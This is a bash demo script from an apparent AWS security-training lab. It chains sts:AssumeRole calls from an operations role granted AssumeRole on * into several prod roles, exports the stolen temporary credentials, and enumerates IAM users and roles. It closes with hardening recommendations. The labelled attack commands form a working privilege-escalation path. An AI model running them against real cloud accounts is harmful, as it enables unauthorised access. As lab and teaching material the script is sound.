#!/bin/bash

# Demo script for x-account-from-operations-to-prod-simple-role-assumption module
# This script demonstrates cross-account role assumption from operations to prod environments
# It shows how an operations role with sts:AssumeRole on * can assume any role in prod


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

echo -e "${BLUE}=== Pathfinding-labs Cross-Account Operations to Prod Role Assumption Demo ===${NC}"
echo "This demo shows how operations roles can assume roles in prod accounts."
echo ""

# Retrieve readonly credentials for observation steps
cd ../../../../../..  # Navigate to root of terraform project
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
cd - > /dev/null

# Credential switching helpers
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
use_starting_profile() {
    unset AWS_ACCESS_KEY_ID
    unset AWS_SECRET_ACCESS_KEY
    unset AWS_SESSION_TOKEN
}

echo -e "${GREEN}✓ Retrieved readonly credentials from Terraform${NC}"
echo ""

# --- Configuration ---
# [OBSERVATION] Step 0: Get account IDs using profiles and readonly creds
OPS_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-operations --query Account --output text)
use_readonly_creds
PROD_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

OPS_STARTING_USER_PROFILE="pl-pathfinding-starting-user-operations"
OPS_ROLE_NAME="pl-x-account-ops-role-with-assume-role-star"
PROD_ROLE_1_NAME="pl-x-account-prod-role-trusts-operations"
PROD_ROLE_2_NAME="pl-x-account-prod-admin-role-trusts-operations"
PROD_ROLE_3_NAME="pl-x-account-prod-admin-role"

echo -e "${YELLOW}Step 1: Account Information${NC}"
echo "Operations Account ID: $OPS_ACCOUNT_ID"
echo "Prod Account ID: $PROD_ACCOUNT_ID"
echo ""

# [EXPLOIT] Step 2: Assume Operations Role
echo -e "${YELLOW}Step 2: Assuming Operations Role with sts:AssumeRole on *${NC}"
OPS_ROLE_ARN="arn:aws:iam::${OPS_ACCOUNT_ID}:role/${OPS_ROLE_NAME}"

echo "Operations Role ARN: $OPS_ROLE_ARN"
echo "Assuming operations role..."
show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo" --profile "$OPS_STARTING_USER_PROFILE""
OPS_ASSUME_OUTPUT=$(aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo" --profile "$OPS_STARTING_USER_PROFILE")
export AWS_ACCESS_KEY_ID=$(echo "$OPS_ASSUME_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$OPS_ASSUME_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$OPS_ASSUME_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed operations role${NC}"


# [OBSERVATION] Step 3: Verify operations role permissions (using assumed ops role creds)
echo -e "${YELLOW}Step 3: Verifying Operations Role Permissions${NC}"
echo "Current caller identity:"
show_cmd "Attacker" "aws sts get-caller-identity"
aws sts get-caller-identity

echo ""
echo "Testing sts:AssumeRole permission on * (this is very dangerous!)"
echo "The operations role has sts:AssumeRole permission on all resources (*)"
echo -e "${RED}⚠️  This is a critical security vulnerability!${NC}"
echo ""

# [EXPLOIT] Step 4: Assume Prod Role 1 (SecurityAudit permissions)
echo -e "${YELLOW}Step 4: Assuming Prod Role 1 (SecurityAudit permissions)${NC}"
PROD_ROLE_1_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/${PROD_ROLE_1_NAME}"

echo "Prod Role 1 ARN: $PROD_ROLE_1_ARN"
echo "Assuming prod role 1 from operations role..."
show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PROD_ROLE_1_ARN" --role-session-name "prod-role-1-demo""
PROD_ASSUME_OUTPUT_1=$(aws sts assume-role --role-arn "$PROD_ROLE_1_ARN" --role-session-name "prod-role-1-demo")
export AWS_ACCESS_KEY_ID=$(echo "$PROD_ASSUME_OUTPUT_1" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ASSUME_OUTPUT_1" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$PROD_ASSUME_OUTPUT_1" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed prod role 1${NC}"


# [OBSERVATION] Step 5: Verify prod role 1 access (using assumed prod role 1 creds)
echo -e "${YELLOW}Step 5: Verifying Prod Role 1 Access${NC}"
echo "Current caller identity:"
show_cmd "Attacker" "aws sts get-caller-identity"
aws sts get-caller-identity

echo ""
echo "Testing SecurityAudit permissions..."
echo "Listing IAM users (SecurityAudit allows read-only access):"
show_cmd "Attacker" "aws iam list-users --max-items 5 --query 'Users[].UserName' --output text"
aws iam list-users --max-items 5 --query 'Users[].UserName' --output text

echo -e "${GREEN}✓ Successfully demonstrated SecurityAudit access${NC}"

# Reset credentials for next test
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN


# [EXPLOIT] Step 6: Assume Prod Role 2 via re-assumed operations role
echo -e "${YELLOW}Step 6: Assuming Prod Role 2 (Another SecurityAudit role)${NC}"
# Re-assume operations role
OPS_ASSUME_OUTPUT_2=$(aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo-2" --profile "$OPS_STARTING_USER_PROFILE")
export AWS_ACCESS_KEY_ID=$(echo "$OPS_ASSUME_OUTPUT_2" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$OPS_ASSUME_OUTPUT_2" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$OPS_ASSUME_OUTPUT_2" | jq -r '.Credentials.SessionToken')

PROD_ROLE_2_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/${PROD_ROLE_2_NAME}"
echo "Prod Role 2 ARN: $PROD_ROLE_2_ARN"
echo "Assuming prod role 2 from operations role..."
show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PROD_ROLE_2_ARN" --role-session-name "prod-role-2-demo""
PROD_ASSUME_OUTPUT_2=$(aws sts assume-role --role-arn "$PROD_ROLE_2_ARN" --role-session-name "prod-role-2-demo")
export AWS_ACCESS_KEY_ID=$(echo "$PROD_ASSUME_OUTPUT_2" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ASSUME_OUTPUT_2" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$PROD_ASSUME_OUTPUT_2" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed prod role 2${NC}"


# [OBSERVATION] Step 7: Verify prod role 2 access (using assumed prod role 2 creds)
echo -e "${YELLOW}Step 7: Verifying Prod Role 2 Access${NC}"
echo "Current caller identity:"
show_cmd "Attacker" "aws sts get-caller-identity"
aws sts get-caller-identity

echo ""
echo "Testing SecurityAudit permissions on role 2..."
echo "Listing IAM roles (SecurityAudit allows read-only access):"
show_cmd "Attacker" "aws iam list-roles --max-items 5 --query 'Roles[].RoleName' --output text"
aws iam list-roles --max-items 5 --query 'Roles[].RoleName' --output text

echo -e "${GREEN}✓ Successfully demonstrated SecurityAudit access via role 2${NC}"

# Reset credentials for next test
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN


# [EXPLOIT] Step 8: Demonstrate dangerous sts:AssumeRole on * - assume a third prod role
echo -e "${YELLOW}Step 8: Demonstrating Dangerous sts:AssumeRole on *${NC}"
# Re-assume operations role
OPS_ASSUME_OUTPUT_3=$(aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo-3" --profile "$OPS_STARTING_USER_PROFILE")
export AWS_ACCESS_KEY_ID=$(echo "$OPS_ASSUME_OUTPUT_3" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$OPS_ASSUME_OUTPUT_3" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$OPS_ASSUME_OUTPUT_3" | jq -r '.Credentials.SessionToken')

echo "The operations role has sts:AssumeRole permission on * (all resources)"
echo "This means it can assume ANY role in ANY account, not just the trusted ones!"
echo -e "${RED}⚠️  This is an extremely dangerous configuration!${NC}"

echo ""
echo "Attempting to assume a role that trusts operations account..."
PROD_ROLE_3_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/${PROD_ROLE_3_NAME}"
echo "Prod Role 3 ARN: $PROD_ROLE_3_ARN"
echo "Assuming prod role 3 from operations role..."
show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PROD_ROLE_3_ARN" --role-session-name "prod-role-3-demo""
PROD_ASSUME_OUTPUT_3=$(aws sts assume-role --role-arn "$PROD_ROLE_3_ARN" --role-session-name "prod-role-3-demo")
export AWS_ACCESS_KEY_ID=$(echo "$PROD_ASSUME_OUTPUT_3" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ASSUME_OUTPUT_3" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$PROD_ASSUME_OUTPUT_3" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed prod role 3${NC}"


# [OBSERVATION] Step 9: Verify final role access (using assumed prod role 3 creds)
echo -e "${YELLOW}Step 9: Verifying Final Role Access${NC}"
echo "Current caller identity:"
show_cmd "Attacker" "aws sts get-caller-identity"
aws sts get-caller-identity

echo ""
echo "Testing final role permissions..."
echo "This role has no policies attached, so it has no permissions."
echo "This demonstrates that even with sts:AssumeRole on *, you still need proper policies attached to roles."
echo "Attempting to list IAM users (this should fail):"
aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null || echo "✓ As expected, this role has no permissions"

echo -e "${GREEN}✓ Successfully demonstrated cross-account role assumption${NC}"

# Reset credentials
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo ""
echo -e "${YELLOW}Step 10: Security Analysis${NC}"
echo "This demo revealed several critical security issues:"
echo "1. Operations role has sts:AssumeRole permission on * (all resources)"
echo "2. This allows assuming ANY role in ANY account"
echo "3. Multiple prod roles trust the operations account"
echo "4. This creates a dangerous privilege escalation path"
echo ""
echo -e "${RED}⚠️  Recommendations:${NC}"
echo "- Never grant sts:AssumeRole on * to any role"
echo "- Use specific role ARNs in assume role policies"
echo "- Implement least privilege access"
echo "- Regularly audit cross-account trust relationships"

echo ""
echo -e "${GREEN}=== Demo Complete ===${NC}"
echo "This demonstrates the dangers of overly permissive cross-account role assumptions."

# Standardized test results output
echo "TEST_RESULT:x-account-from-operations-to-prod-simple-role-assumption:SUCCESS"
echo "TEST_DETAILS:x-account-from-operations-to-prod-simple-role-assumption:Successfully demonstrated dangerous cross-account role assumption with sts:AssumeRole on *"
echo "TEST_METRICS:x-account-from-operations-to-prod-simple-role-assumption:ops_role_assumed=true,prod_roles_assumed=3,sts_assume_role_star_demonstrated=true,security_audit_access_gained=true"

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
